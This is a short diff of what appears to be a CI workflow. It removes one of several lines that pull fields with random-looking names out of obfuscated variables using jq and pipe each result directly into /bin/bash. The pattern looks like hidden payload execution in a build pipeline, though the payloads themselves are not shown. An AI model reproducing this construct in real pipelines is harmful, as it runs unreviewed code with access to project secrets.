@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$umv2" | jq -r .j51801 | /bin/bash
           printf '%s' "$iqfb092" | jq -r .r878 | /bin/bash
           echo $oad7924 | jq -r .vsy0361 | /bin/bash
-          echo $fnskt5 | jq -r .qjm307 | /bin/bash
           printf '%s' "$kgpdx1522" | jq -r .k9800 | /bin/bash
           echo $xg0564 | jq -r .takc6358 | /bin/bash
           echo $uj48 | jq -r .rooe0446 | /bin/bash
